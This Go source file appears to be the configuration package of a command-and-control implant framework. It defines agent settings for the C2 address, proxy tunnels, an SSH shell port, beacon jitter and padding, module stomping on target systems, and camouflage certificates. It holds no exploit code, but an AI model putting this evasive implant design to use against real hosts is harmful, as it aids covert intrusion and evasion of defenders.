package def

import (
	"github.com/fxamacker/cbor/v2"
)

func init() {
	AESPassword = GenAESKey(MagicString)
}

// ReadCBORConfig read runtime variables from CBOR, and apply them
func ReadCBORConfig(cborData []byte, config_to_write *Config) (err error) {
	return cbor.Unmarshal(cborData, config_to_write)
}

const (
	// Localhost represents the local loopback address
	Localhost = "127.0.0.1"
)

// C2Routing randomized names for each service
type C2Routing struct {
	Checkin string `cbor:"1,keyasint"`
	Msg     string `cbor:"2,keyasint"`
	FTP     string `cbor:"3,keyasint"`
	WWW     string `cbor:"4,keyasint"`
	Proxy   string `cbor:"5,keyasint"`
}

// Config build.json config file
type Config struct {
	CCAddress                 string `cbor:"1,keyasint"`  // Address of C2 server, might include port (agent side)
	CCHost                    string `cbor:"2,keyasint"`  // Hostname of C2 server (hostname only)
	CCPort                    string `cbor:"3,keyasint"`  // CC service port, TLS enabled
	AgentSocksServerPort      string `cbor:"4,keyasint"`  // agent side socks5 proxy server port
	AgentSocksTimeout         int    `cbor:"5,keyasint"`  // timeout (in seconds) for agent side Socks5 server, 0 to disable
	StagerHTTPListenerPort    string `cbor:"6,keyasint"`  // For stager HTTP server
	Password                  string `cbor:"7,keyasint"`  // password of shadowsocks, socks5 and SSH server
	ShadowsocksLocalSocksPort string `cbor:"8,keyasint"`  // socks5 port of shadowsocks
	ShadowsocksServerPort     string `cbor:"9,keyasint"`  // server port of shadowsocks proxy server, can run on CC and agent
	KCPServerPort             string `cbor:"10,keyasint"` // server port of kcp server
	KCPClientPort             string `cbor:"11,keyasint"` // client port of kcp
	UseKCP                    bool   `cbor:"12,keyasint"` // enable KCP for Shadowsocks C2 transport
	EnableNCSI                bool   `cbor:"13,keyasint"` // NCSI connectivity checking, disable when C2 is reachable but NCSI is not
	SSHHostKey                []byte `cbor:"14,keyasint"` // SSH host (private) key (PEM string), used by remote forwarding server
	Bring2CCReverseProxyPort  string `cbor:"15,keyasint"` // Used to bring target host to C2, see Bring2CC
	SSHDShellPort             string `cbor:"16,keyasint"` // interactive shell
	MeshGossipPort            string `cbor:"17,keyasint"` // UDP/TCP port for gossip (memberlist)
	// Preflight Config
	PreflightEnabled bool              `cbor:"20,keyasint"` // Enable preflight check
	PreflightURL     string            `cbor:"21,keyasint"` // URL for preflight check
	PreflightMethod  string            `cbor:"22,keyasint"` // HTTP method (GET/POST) TODO: Implement method selection in client
	PreflightHeaders map[string]string `cbor:"23,keyasint"` // Headers for preflight request
	// Beacon interval for Hybrid Mode
	PreflightIntervalMin int `cbor:"29,keyasint"` // seconds
	PreflightIntervalMax int `cbor:"30,keyasint"` // seconds

	CAPEM            string `cbor:"24,keyasint"` // CA cert from server side
	CAFingerprint    string `cbor:"25,keyasint"` // CA cert fingerprint
	C2TransportProxy string `cbor:"26,keyasint"` // proxy for C2 transport
	CDNProxy         string `cbor:"27,keyasint"` // websocket proxy, see go-cdn2proxy
	DoHServer        string `cbor:"28,keyasint"` // DNS over HTTPS server, for name resolving

	// These were deprecated and removed
	AgentUUID    string `cbor:"32,keyasint"` // UUID of agent, used to verify agent
	AgentUUIDSig string `cbor:"33,keyasint"` // UUID of agent signed by CA
	AgentTag     string `cbor:"34,keyasint"` // generated from UUID, will be used to identidy agents
	CCTimeout    int    `cbor:"35,keyasint"` // wait until this amount of milliseconds to re-connect to C2

	// Payload-length malleability (padding only — no HTTP path tuning needed)
	PaddingMin int `cbor:"55,keyasint"` // min bytes of random padding per CBOR frame
	PaddingMax int `cbor:"56,keyasint"` // max bytes of random padding per CBOR frame
	Jitter     int `cbor:"57,keyasint"` // percent jitter added to check-in interval
	// Module Stomping
	ModulePath    string `cbor:"58,keyasint"` // Path to the module to stomp (overwrite) on the target system
	IsRunByStager bool   `cbor:"59,keyasint"` // Whether the agent is run by a stager

	MachineID string `cbor:"60,keyasint"` // machine ID

	InitialPeers []string `cbor:"64,keyasint"` // Initial gossip bootstrap peers

	// Mesh / P2P configuration
	IsP2PEnabled      bool   `cbor:"70,keyasint"` // set by generate --p2p
	IsDirectC2Enabled bool   `cbor:"71,keyasint"` // set by generate --direct-c2 (Gateway mode: P2P + direct C2 + preflight)
	P2PTransport      string `cbor:"72,keyasint"` // Transport for P2P mesh (e.g. kcp, mtls)
	CamouflageCertOrg string `cbor:"73,keyasint"` // Camouflage cert organization (random if empty)
	CamouflageCertCN  string `cbor:"74,keyasint"` // Camouflage cert common name (random if empty)

	// C2 Routing malleability
	C2Routes C2Routing `cbor:"75,keyasint"`

	// Runtime state (not persisted in config file)
	MyAgentToken *AgentToken `cbor:"-"` // Current AgentToken issued by C2
}

